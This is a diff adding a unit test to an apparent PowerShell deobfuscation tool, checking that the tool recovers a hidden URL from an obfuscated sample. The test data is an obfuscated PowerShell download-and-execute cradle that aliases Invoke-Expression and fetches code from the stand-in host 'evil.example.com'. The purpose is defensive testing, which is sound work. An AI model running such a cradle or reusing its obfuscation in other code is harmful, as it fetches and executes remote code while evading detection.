@@ -26,3 +26,10 @@ class TestPowerShellDeobfuscator(TestUnitBase):
             B'abrakam.site'
         ]:
             self.assertIn(c2server, result)
+
+    def test_real_world_03(self):
+        data = BR'''$v='i'+''+'E'+'x';sal foo $v;$pzhhqdwl=foo(foo($($('(nQNVrd3W2GjJK36w-objQNVrd3W2GjJK36ct SystQNVrd3W2GjJK36m.NQNVrd3W2GjJK36t.WQNVrd3W2GjJK36bCliQNVrd3W2GjJK36nt).Dos2Wr6qQRtring(''hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm''.Replace(''fTdH8C6'',''ttps://'').Replace(''s97YMGcyg0WCr'',''o'').Replace(''z2Wr6qQR'', ''e''))').Replace('QNVrd3W2GjJK36', 'e').Replace('s2Wr6qQR', 'wnloadS'))))'''
+        deob = self.load()
+        extract = self.ldu('carve', 'ps1str', single=True, decode=True)
+        self.assertIn(b'https://evil.example.com/boom',
+            data | deob | extract | deob | bytes)
